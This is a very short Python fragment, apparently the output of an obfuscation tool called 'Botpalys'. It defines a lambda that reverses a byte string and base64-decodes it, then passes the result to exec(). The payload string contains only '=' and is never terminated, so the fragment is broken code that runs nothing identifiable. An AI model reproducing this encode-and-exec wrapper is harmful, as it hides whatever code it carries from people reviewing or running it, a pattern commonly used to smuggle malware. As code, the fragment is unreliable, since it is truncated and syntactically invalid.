# Obfuscated by the Botpalys encoder
#Time: Fri Oct 24 16:32:44 2025
_ = lambda __ : __import__('base64').b64decode(__[::-1]);exec((_)(b'=
